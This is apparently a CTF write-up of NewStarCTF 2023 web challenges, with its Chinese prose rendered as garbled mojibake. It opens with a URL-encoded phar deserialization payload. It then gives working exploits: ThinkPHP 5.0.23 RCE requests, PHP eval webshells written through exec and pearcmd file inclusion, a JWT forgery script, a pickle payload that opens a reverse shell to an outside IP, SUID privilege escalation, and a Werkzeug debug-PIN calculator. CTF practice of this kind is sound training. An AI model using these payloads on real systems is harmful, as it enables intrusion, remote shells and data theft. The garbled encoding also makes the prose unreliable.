%3C%3Fphp%20__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0Av%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%40%00%00%00O%3A5%3A%22story%22%3A3%3A%7Bs%3A6%3A%22eating%22%3Bs%3A7%3A%22cat%20/f%2A%22%3Bs%3A3%3A%22God%22%3Bs%3A4%3A%22true%22%3B%7D%08%00%00%00test.txt%04%00%00%00%E7%28Ne%04%00%00%00%0C~%7F%D8%B6%01%00%00%00%00%00%00test%F3nV%C6%07%A7%D9%96%86%CC%1A%95%19%CE3%DA%DC%0A%21-%02%00%00%00GBMB ![image-20231110210513035](NewStarCTF 2023/image-20231110210513035.png) æ‹¿åˆ°flag WEEK5|WEB-Final è¿™é‡Œè®¿é—®é¦–é¡µå‘ç°æ˜¯thinkphpæ¡†æ¶ï¼Œé‚£æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£å…¶ç‰ˆæœ¬ï¼Œç›´æ¥urlåé¢æ‹¼æ¥ä»»æ„å­—ç¬¦ï¼Œä½¿å…¶æŠ¥é”™è€Œæ³„éœ²ç‰ˆæœ¬ä¿¡æ¯ ![image-20231111090429701](NewStarCTF 2023/image-20231111090429701.png) å¦‚ä¸Šå›¾ä¸º5.0.23-å¯¹åº”çš„æ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œç›´æ¥ä¸Šé€šç”¨payloadï¼š /index.php?s=captcha POST: _method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5 å¦‚ä¸‹å›¾ï¼Œå‘ç°systemè¢«ç¦ç”¨äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€‰æ‹©åå¼¹shellï¼Œå‡½æ•°å‘¢é€‰æ‹©execå³å¯ ![image-20231111085326347](NewStarCTF 2023/image-20231111085326347.png) bash -i &gt;&amp; /dev/tcp/192.168.1.12/1234 0&gt;&amp;1 _method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo '&lt;?php eval($_POST['cmd']);?&gt;' &gt; /var/www/public/1.php è¿™é‡Œç”¨çš„æ˜¯å®˜æ–¹wpçš„payloadï¼Œä¸çŸ¥ä¸ºä½•è¿™é‡Œåå¼¹shellä¼¼ä¹ä¸æˆåŠŸï¼Œäºæ˜¯é‡‡ç”¨äº†execå†™å…¥æ–‡ä»¶çš„æ–¹å¼æ¥æ‰§è¡Œã€‚ å¦‚ä¸Šè¿°æ‰§è¡ŒæˆåŠŸåï¼Œèšå‰‘è¿æ¥ï¼Œè¿›å…¥ç»ˆç«¯åæ˜¾ç¤ºæ— æƒé™è¯»å– ![image-20231111093346977](NewStarCTF 2023/image-20231111093346977.png) è¿™é‡Œä¹Ÿæ˜¯çœ‹wpå‘ç°ç”¨suidææƒï¼ˆä¹‹å‰ä¹Ÿæ²¡äº†è§£è¿‡ã€‚ã€‚ã€‚ã€‚ é‚£æˆ‘ä»¬å…ˆæŸ¥çœ‹å…·æœ‰suidæƒé™çš„å‘½ä»¤ï¼Œè¿™é‡Œä¸çŸ¥ä¸ºä½•è¾“å…¥å‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œéšåæƒ³åˆ°å°†å‘½ä»¤ç»“æœå†™å…¥æ–‡ä»¶ä¸­æ¥è¯»å– find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null &gt; 1.txt ä¹‹åcat 1.txtçœ‹åˆ°ç›¸å…³å‘½ä»¤ ![image-20231111093527982](NewStarCTF 2023/image-20231111093527982.png) é‚£æˆ‘ä»¬ç›´æ¥ç”¨cpè¦†ç›–å³å¯ cp /flag_dd3f6380aa0d /etc/passwd ![image-20231111092542066](NewStarCTF 2023/image-20231111092542066.png) æ‹¿åˆ°flag WEEK5|WEB-Yeâ€™s Pickle ![image-20231111122457883](NewStarCTF 2023/image-20231111122457883.png) è¿›å…¥é¦–é¡µç»™æˆ‘ä»¬å±•ç¤ºäº†tokenï¼Œçœ‹ç€æœ‰ä¸€éƒ¨åˆ†åƒbase64ï¼Œé‚£æˆ‘ä»¬è§£å¯†ä¸€ä¸‹çœ‹çœ‹ ![image-20231111122534595](NewStarCTF 2023/image-20231111122534595.png) è§£å¯†å‘ç°å«æœ‰jwtï¼Œé‚£å°±æœ‰å¯èƒ½éœ€è¦è¿›è¡Œjwtä¼ªé€ ã€‚æ¥ä¸‹æ¥å®¡è®¡ä¸€ä¸‹é¢˜ç›®ç»™çš„é™„ä»¶ # -*- coding: utf-8 -*- import base64 import string import random from flask import * import jwcrypto.jwk as jwk import pickle from python_jwt import * app = Flask(__name__) def generate_random_string(length=16): characters = string.ascii_letters + string.digits # åŒ…å«å­—æ¯å’Œæ•°å­— random_string = ''.join(random.choice(characters) for _ in range(length)) return random_string app.config['SECRET_KEY'] = generate_random_string(16) key = jwk.JWK.generate(kty='RSA', size=2048) @app.route(\"/\") def index(): payload=request.args.get(\"token\") if payload: token=verify_jwt(payload, key, ['PS256']) session[\"role\"]=token[1]['role'] return render_template('index.html') else: session[\"role\"]=\"guest\" user={\"username\":\"boogipop\",\"role\":\"guest\"} jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60)) return render_template('index.html',token=jwt) @app.route(\"/pickle\") def unser(): if session[\"role\"]==\"admin\": pickle.loads(base64.b64decode(request.args.get(\"pickle\"))) return render_template(\"index.html\") else: return render_template(\"index.html\") if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=5000, debug=True) ç¬¬ä¸€ä¸ªå‡½æ•°ä¸»è¦æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼Œç”¨äºFlaskåº”ç”¨ç¨‹åºå¯†é’¥çš„éšæœºå­—ç¬¦ä¸²ã€‚æ¥ç€ä½¿ç”¨ jwcrypto.jwk åº“ç”Ÿæˆäº†ä¸€ä¸ªRSAå¯†é’¥ (key)ã€‚ ç„¶å/è·¯ç”±å¯¹åº”çš„æ–¹æ³•ï¼Œé¦–å…ˆæ˜¯æ¥å—ä¸€ä¸ªtokençš„ä¼ å‚ï¼Œéšåå¦‚æœpayloadå­˜åœ¨ï¼Œå°±ä½¿ç”¨verify_jwtè¿›è¡Œjwtçš„éªŒè¯ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™å°†roleèµ‹å€¼ä¸ºadminã€‚æ¥ä¸‹æ¥çœ‹pickleè·¯ç”±ï¼Œå¯¹åº”çš„æ˜¯pickleååºåˆ—åŒ–ï¼Œè¿™é‡Œå¦‚æœroleå¯¹åº”çš„å€¼ä¸ºadminï¼Œåˆ™å¯¹ä¼ å…¥çš„pickleå‚æ•°è¿›è¡Œpickleååºåˆ—åŒ–å¤„ç†ã€‚ é‚£æ€è·¯æ¸…æ™°äº†ï¼Œæˆ‘ä»¬å°±æ˜¯è¦æƒ³åŠæ³•è¿›è¡Œjwtçš„ä¼ªé€ ï¼Œä½¿å¾—roleçš„å€¼ä¸ºadminï¼Œä»è€Œè¿›è¡Œpickleå‘åºåˆ—åŒ–è¿›è¡ŒRCEï¼ˆè¿™é‡Œç”±äºæˆ‘ä¹Ÿæ²¡å­¦è¿‡ï¼Œå°±ç›´æ¥çœ‹wpäº†ï¼‰ expå¦‚ä¸‹ï¼š from datetime import timedelta import base64 from json import loads, dumps from jwcrypto.common import base64url_decode, base64url_encode def topic(topic): \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\" [header, payload, signature] = topic.split('.') parsed_payload = loads(base64url_decode(payload)) parsed_payload['role'] = \"admin\" #parsed_payload['exp'] = 2000000000 fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':')))) return '{\" ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"}' token = topic('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.35mISFjtHpWWuJ6BMQsUQCrZ5iLMGvUSIeu3S7uNsPp_b-VnH9VmFFrZFf41xRQOG0hXFE1nQUWU_gEjbVsC7vTB0U6Ia9joAYgmgLAom2-i7hFsaLzJItLGtgHhz-HmcKerJ5QCvQeqXdSsmhRESXdg3NHQ-lHS9-2go2BXOtJjSy-MwKrOZJ2KAAMWMCR_P-CRIaZ0s7dLX1oeAfS7V5gRh-_tJGejQ_U7-jyqOa1mgDIIgczZYIfY-1Su34GhT7kWUUNulFkqSDy6OjARtC1ZhGOHKVd50ITnsDnT_NSzXARmZuMKEe5_2_k2E_-l2Pm4aIAQeSpx7oY5ueUGxQ') print(token) p=b\"(cos system S'bash -c \\\"bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1\\\"' o\" payload=base64.b64encode(p) print(payload) å¯å‚è€ƒï¼šhttps://exp10it.cn/2022/10/2022-ç¥¥äº‘æ¯-web-writeup/#funwebå¤ç° éšæœºå¯¹ç”Ÿæˆçš„jwtåœ¨/è·¯ç”±ä¸‹èµ‹å€¼ç»™tokenä¼ å…¥ï¼ˆè®°å¾—è¿›è¡Œurlç¼–ç ï¼‰ {\" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.\":\"\",\"protected\":\"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9\", \"payload\":\"eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9\",\"signature\":\"35mISFjtHpWWuJ6BMQsUQCrZ5iLMGvUSIeu3S7uNsPp_b-VnH9VmFFrZFf41xRQOG0hXFE1nQUWU_gEjbVsC7vTB0U6Ia9joAYgmgLAom2-i7hFsaLzJItLGtgHhz-HmcKerJ5QCvQeqXdSsmhRESXdg3NHQ-lHS9-2go2BXOtJjSy-MwKrOZJ2KAAMWMCR_P-CRIaZ0s7dLX1oeAfS7V5gRh-_tJGejQ_U7-jyqOa1mgDIIgczZYIfY-1Su34GhT7kWUUNulFkqSDy6OjARtC1ZhGOHKVd50ITnsDnT_NSzXARmZuMKEe5_2_k2E_-l2Pm4aIAQeSpx7oY5ueUGxQ\"} å¦‚ä¸‹å›¾ï¼Œåè¾¹çš„cookieè¿›è¡Œjwtè§£å¯†ä¸€ä¸‹å³å¯çœ‹åˆ°æˆ‘ä»¬çš„roleæ˜¯admin ![image-20231111121522491](NewStarCTF 2023/image-20231111121522491.png) éšæœºå°†å³ä¾§çš„sessionèµ‹å€¼ç»™æˆ‘ä»¬å½“å‰çš„cookieï¼Œè¿›è¡Œadminçš„ä¼ªé€ ï¼Œæ¥ç€åœ¨pickleè·¯ç”±ä¸‹ï¼Œå¯¹pickleå‚æ•°ä¼ å…¥æ¶æ„ä»£ç è¿›è¡ŒRCE b'KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjMzLjI2LzU1NTUgMD4mMSInCm8=' ![image-20231111123516998](NewStarCTF 2023/image-20231111123516998.png) ![image-20231111123531742](NewStarCTF 2023/image-20231111123531742.png) æˆåŠŸæ‹¿åˆ°flag WEEK5|WEB-pppython? &lt;?php if ($_REQUEST['hint'] == [\"your?\", \"mine!\", \"hint!!\"]){ header(\"Content-type: text/plain\"); system(\"ls / -la\"); exit(); } try { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']); $output = curl_exec($ch); echo $output; curl_close($ch); }catch (Error $x){ highlight_file(__FILE__); highlight_string($x-&gt;getMessage()); } ?&gt; curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value é¦–å…ˆæˆ‘ä»¬å…ˆç»™hintèµ‹å€¼ä¸ºæ•°ç»„å½¢å¼ï¼Œæ¥å–å¾—ä¸€äº›æ ¹ç›®å½•çš„ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ç«Ÿç„¶ä¸ä¼šï¼Œé—®äº†GPTå‘ç°è¦æ„é€ å¦‚ä¸‹payload ?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!! ![image-20231111144323387](NewStarCTF 2023/image-20231111144323387.png) å¦‚å›¾çœ‹åˆ°å­˜åœ¨flagä¸app.pyï¼Œé‚£æˆ‘ä»¬åº”è¯¥å°è¯•å»è¯»å–ï¼Œæ¥ä¸‹æ¥åœ¨çœ‹ä¸€ä¸‹ä»£ç ï¼Œå‘ç°å¯ä»¥è¿›è¡Œssrfä¸fileé…åˆè¯»å–ä¸€ä¸‹æ–‡ä»¶å†…å®¹ ?url=file:///app.py&amp;lolita[]=\"Content-type: text/plain from flask import Flask, request, session, render_template, render_template_string import os, base64 #from NeepuF1Le import neepu_files app = Flask(__name__) app.config['SECRET_KEY'] = '******' @app.route('/') def welcome(): if session[\"islogin\"] == True: return \"flag{***********************}\" app.run('0.0.0.0', 1314, debug=True)1 å‘ç°è¿™ä¾æ—§å¼€å¯äº†debugæ¨¡å¼ï¼Œä¼¼ä¹æš—ç¤ºç€æˆ‘è¦è®¡ç®—PINç ï¼Ÿ ä¸è¿‡è¿™é‡Œéœ€è¦çŸ¥é“keyæ˜¯ä»€ä¹ˆï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“å¦‚ä½•æ‰¾ï¼Œåªèƒ½ç»§ç»­çœ‹wpäº†ï¼Œè¿™é‡Œwpè¯´ï¼š ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ç®—cookieï¼Œæ³¨æ„machine_idä¸­ï¼Œ/proc/self/cgroupå­—æ®µçš„ç”Ÿæˆè¿‡ç¨‹ï¼Œä»¥åŠcookieçš„ç”Ÿæˆæ–¹å¼ ![image-20231111155146958](NewStarCTF 2023/image-20231111155146958.png) è¿™é‡Œä¹Ÿçœ‹ä¸æ‡‚ä¸Šé¢å›¾ç‰‡çš„å†…å®¹ã€‚ã€‚ã€‚ã€‚ä»–ç›´æ¥ç»™äº†è„šæœ¬ # sha1 import hashlib import time from itertools import chain probably_public_bits = [ 'root' # /etc/passwd, /etc/shadowéªŒè¯ 'flask.app', # é»˜è®¤å€¼ 'Flask',# é»˜è®¤å€¼ 'Flask' '/usr/local/lib/python3.10/dist-packages/flask/app.py' # æŠ¥é”™å¾—åˆ° ] bid = \"8cab9c97-85be-4fb4-9d17-29335d7b2b8a\" did = \"12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod0604f7b8_b39d_4c8d_8daf_6fb4636bb08a.slice/docker-f7abee7266a5d18c009c35c7978cbfb3d46348fa36d942f0ee430159bc92b75f.scope\" did = did.strip().rpartition(\"/\")[2] print(did) private_bits = [ '20724999646420262722', # /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶ # machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1. /etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup bid + did # /proc/sys/kernel/random/boot_id ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num def hash_pin(pin: str) -&gt; str: return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12] print(rv) print(cookie_name + \"=\" + f\"{int(time.time())}|{hash_pin(rv)}\") # 8Gb9QOttxQ8IUbpZ3dxJ # http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(\"os\").popen(\"cat /flag\").read()&amp;frm=0&amp;s=8Gb9QOttxQ8IUbpZ3dxJ 8Gb9QOttxQ8IUbpZ3dxJçš„ç”±æ¥æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå¦‚ä¸‹payloadï¼š ?url=http://localhost:1314/console&amp;lolita[]= æŸ¥çœ‹æºä»£ç ï¼Œå…¶ä¸­çš„keyå°±æ˜¯ä¸Šè¿°å­—ç¬¦ä¸² æœ€ç»ˆpayloadï¼š ?url=http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(\"os\").popen(\"cat /flag\").read()&amp;frm=0&amp;s=8Gb9QOttxQ8IUbpZ3dxJ&amp;lolita[]=Cookie: __wzdcdf8d549bf3448b85cde=1699692440|f54e820d6355 è¿™é‡Œçœ‹ç€wpå†™çš„payloadå°±æ˜¯ä¸Šé¢çš„ï¼Œä½†ä¸çŸ¥ä¸ºä½•æˆ‘è¿™é‡Œæ‰§è¡Œåˆ°å¦‚ä¸‹é¡µé¢ä¹‹åï¼Œè¾“å…¥PINç æ²¡ååº”ã€‚ã€‚ã€‚ ![image-20231111160337335](NewStarCTF 2023/image-20231111160337335.png) æ„Ÿè§‰è¿˜æ˜¯ä¸å¤ªæ‡‚åŸç†çš„é—®é¢˜ï¼Œå…ˆåšå…¶ä»–äº†ï¼Œåé¢å­¦äº†å†çœ‹çœ‹ WEEK5|WEB-4-å¤ç›˜ è¿™é‡Œçœ‹é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œä»¥ä¸ºåˆæ˜¯ä¸€ä¸ªå¤§å‹çš„å®¡è®¡ä»£ç é¢˜ç›®ï¼Œä¸è¿‡åœ¨index.phpå¤„å°±å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ &lt;?php require_once 'inc/header.php'; ?&gt; &lt;?php require_once 'inc/sidebar.php'; ?&gt; &lt;!-- Content Wrapper. Contains page content --&gt; &lt;?php if (isset($_GET['page'])) { $page ='pages/' .$_GET['page'].'.php'; }else{ $page = 'pages/dashboard.php'; } if (file_exists($page)) { require_once $page; }else{ require_once 'pages/error_page.php'; } ?&gt; &lt;!-- Control Sidebar --&gt; &lt;aside class=\"control-sidebar control-sidebar-dark\"&gt; &lt;!-- Control sidebar content goes here --&gt; &lt;/aside&gt; &lt;!-- /.control-sidebar --&gt; &lt;?php require_once 'inc/footer.php'; ?&gt; è™½ç„¶è¿™é‡Œå­˜åœ¨ï¼Œä½†æˆ‘æƒŠè®¶äºé‚£äº›ä½¬ç›´æ¥å°±åˆ¤æ–­å‡ºæ¥è¿™é“é¢˜æ˜¯pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«çš„åˆ©ç”¨ã€‚ã€‚ã€‚ã€‚ æˆ‘ä»¬ç›´æ¥ä¸Špayloadï¼š ?+config-create+/&amp;page=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+shell.php bpæŠ“åŒ…å‘é€ ![image-20231111171355020](NewStarCTF 2023/image-20231111171355020.png) èšå‰‘è¿æ¥åï¼Œå‘ç°è¯»å–flagä¾æ—§æ²¡æƒé™ï¼Œå¾—ææƒ ![image-20231111171559067](NewStarCTF 2023/image-20231111171559067.png) çœ‹çœ‹suidææƒå¦‚ä½•ï¼š find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null &gt; 1.txt è¿™é‡Œä¸çŸ¥é“ä¸ºä½•ï¼Œå†™å…¥æ–‡ä»¶ä¹Ÿä¸è¡Œäº†ï¼Œåªå¥½ç›´æ¥çœ‹wpçš„ç­”æ¡ˆ ![image-20231111172304259](NewStarCTF 2023/image-20231111172304259.png) è¿™é‡Œç”¨çš„æ˜¯gzipå‘½ä»¤è¯»å–æ–‡ä»¶ gzip&nbsp;-f&nbsp;/flag&nbsp;-t ä¸è¿‡æœ‰ä¸ªå‘ï¼Œæˆ‘ç›´æ¥å¤åˆ¶ä¸Šå»ï¼Œä¸€ç›´æ˜¾ç¤ºæˆ‘æ‰¾ä¸åˆ°å‘½ä»¤ä»€ä¹ˆçš„ï¼Œæ‰‹åŠ¨è¾“å…¥æ‰èƒ½æˆåŠŸè¯»å–flag ![image-20231111172352530](NewStarCTF 2023/image-20231111172352530.png) WEEK5|WEB-NextDrive ![image-20231111173036849](NewStarCTF 2023/image-20231111173036849.png) å‘ç°testè¿™ä¸ªæ–‡ä»¶å¯ç–‘ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹ HTTP/1.1 200 OK content-type: application/json; charset=utf-8 content-length: 50 date: Tue, 06 Oct 2023 13:39:21 GMT connection: keep-alive keep-alive: timeout=5 {\"code\":0,\"msg\":\"success\",\"logged\":true,\"data\":[{\"name\":\"ã™ãšã‚ feat.åæ˜ - RADWIMPS,åæ˜.flac\",\"hash\":\"5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc\",\"size\":27471829,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700843461,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"ã™ãšã‚ feat.åæ˜ - RADWIMPS,åæ˜.flac\"},{\"name\":\"Windows 12 Concept.png\",\"hash\":\"469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900\",\"size\":440707,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700845931,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"Windows 12 Concept.png\"},{\"name\":\"ä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdf\",\"hash\":\"03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f\",\"size\":330767,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700846014,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"ä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdf\"},{\"name\":\"ä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpg\",\"hash\":\"2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e\",\"size\":32920,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700846039,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"ä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpg\"},{\"name\":\"test.req.http\",\"hash\":\"e3eef7bcdae39764a2950af878a290f301f322ca78ac17c08e9912d384c511a2\",\"size\":1085,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700849837,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"test.req.http\"}]} å¯ä»¥çœ‹åˆ°å¤§æ¦‚æ˜¯æ¯ä¸ªæ–‡ä»¶å¯¹åº”æ–‡ä»¶åï¼Œå“ˆå¸Œå€¼å’Œæ–‡ä»¶å¤§å° è¿™é‡Œæ³¨å†Œä¸ªç”¨æˆ·çœ‹çœ‹ï¼Œä¸è¿‡ä¸èƒ½æ³¨å†Œadminï¼Œä¼°è®¡å°±æ˜¯ä»¥adminçš„èº«ä»½ç™»å½•æ¥è·å–flag éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼ŒF12å‘ç°æœ‰ä¸€ä¸ªcheckçš„è¿‡ç¨‹ï¼Œçœ‹äº†ä¹‹åå¦‚ä¸‹å›¾ ![image-20231111173439321](NewStarCTF 2023/image-20231111173439321.png) æ˜¾ç¤ºäº†ä¸ªæ— æ³•ç§’ä¼ ï¼Œä¹‹åå°±æ˜¯çœ‹wpäº† å‘ç°jsonæ•°æ®åªæœ‰å“ˆå¸Œå€¼å’Œæ–‡ä»¶åï¼Œç”±äºæˆ‘ä»¬åˆšåˆšä¸‹è½½çš„æ–‡ä»¶é‡Œå¯èƒ½å­˜åœ¨æ•æ„Ÿä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯test.req.httpæ–‡ä»¶ï¼ˆå› ä¸ºé¶åœºé¦–é¡µå¹¶æ²¡æœ‰è¯¥æ–‡ä»¶ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨checkæ—¶ä½¿ç”¨è¯¥æ–‡ä»¶å¯¹åº”çš„å“ˆå¸Œå€¼å»ç»•è¿‡ï¼Œä»è€Œä¸‹è½½ä¸‹æ¥è¯¥æ–‡ä»¶ ![image-20231111173852183](NewStarCTF 2023/image-20231111173852183.png) æˆ‘ä»¬è§‚å¯Ÿåˆ°å…¶è¯·æ±‚ä½“åªå«æœ‰fnä¸hashå‚æ•°ï¼Œé‚£æˆ‘ä»¬å®Œå…¨å¯ä»¥æ„é€ ä¸Šè¿°çš„test.req.httpæ¥æ‰‹åŠ¨ä¸Šä¼ è¯¥æ–‡ä»¶ è¿™é‡Œå®˜æ–¹wpå¯¹autopçš„è§£é‡Šï¼šautoup é€‰é¡¹è¡¨ç¤ºæ£€æµ‹è¿‡æœåŠ¡å™¨å­˜åœ¨ç›¸åŒæ–‡ä»¶åç›´æ¥ uploadæ ¹æ®åˆšæ‰çš„ç»“æœ æˆ‘ä»¬bpæ„é€ è¯·æ±‚ ![image-20231111174221977](NewStarCTF 2023/image-20231111174221977.png) å¦‚å›¾ä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬å°†å¾—åˆ°çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹ POST /api/info/drive/sharezone HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Cache-Control: no-cache Connection: keep-alive Content-Length: 0 Content-Type: application/x-www-form-urlencoded Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiJlYzhlM2IzZGYwZTQ4N2FmNDVhYzFiZjIyNGJhOWVhMjViNjQyZTUyN2MyMjU0ZjFkNDQyNjM3YTUwYTQ3Y2MwIn0uY1NwBDFiH2dTfB8iDmJHaQ.BFkKSV5AcQR0RVFhT1QDFVRYDhldQytSf09RYBtXWkRQDwlLD016XXVCAmUfDltDUQsNTAxGKlZzTgo3GgVUQgINDRkMQypRcUYDZUsAAEZRWVkeCEwsXHVGATNJVFtCAggIS1kUK1cmFQNjGA4DQ1NeWU1YQyxRdk4KNB1TARQ Host: localhost:21920 Origin: http://localhost:21920 Pragma: no-cache Referer: http://localhost:21920/sharezone Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0 sec-ch-ua: \"Microsoft Edge\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \"Windows\" çœ‹åˆ°è¿™é‡Œæœ‰äº†cookieå€¼ï¼ŒçŒœæµ‹è¿™ä¸ªå°±æ˜¯adminçš„å‡­è¯ï¼Œæˆ‘ä»¬æˆ–è®¸è¦æ ¹æ®è¯¥å‡­è¯è¿›è¡Œç™»å½• bpæŠ“åŒ…ä¿®æ”¹cookieå€¼ ![image-20231111174628304](NewStarCTF 2023/image-20231111174628304.png) å¦‚å›¾æˆåŠŸä»¥adminèº«ä»½ç™»å½•ï¼Œè¿™é‡Œç™»å½•è¿›å»ä½†å§‹ç»ˆçœ‹ä¸åˆ°share.jsæ–‡ä»¶çš„å‡ºç°ï¼Œä¸çŸ¥é“æ˜¯å•¥åŸå› ï¼Œæ‰€ä»¥æˆ‘æƒ³ç›´æ¥ç•¥è¿‡çœ‹jsæºç äº† è¿™é‡Œå›è¿‡å¤´æ¥åˆå°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ä¼¼ä¹åªæœ‰åœ¨F12å¤„ä¿®æ”¹æ‰å¯ä»¥ ![image-20231111194406842](NewStarCTF 2023/image-20231111194406842.png) å¦‚ä¸Šå›¾ï¼Œä¿®æ”¹è¿‡ååˆ·æ–°é¡µé¢å³å¯å¾—åˆ° const Router = require(\"koa-router\"); const router = new Router(); const CONFIG = require(\"../../runtime.config.json\"); const Res = require(\"../../components/utils/response\"); const FileSignUtil = require(\"../../components/utils/file-signature\"); const { DriveUtil } = require(\"../../components/utils/database.utilities\"); const fs = require(\"fs\"); const path = require(\"path\"); const { verifySession } = require(\"../../components/utils/session\"); const logger = global.logger; /** * @deprecated * ! FIXME: 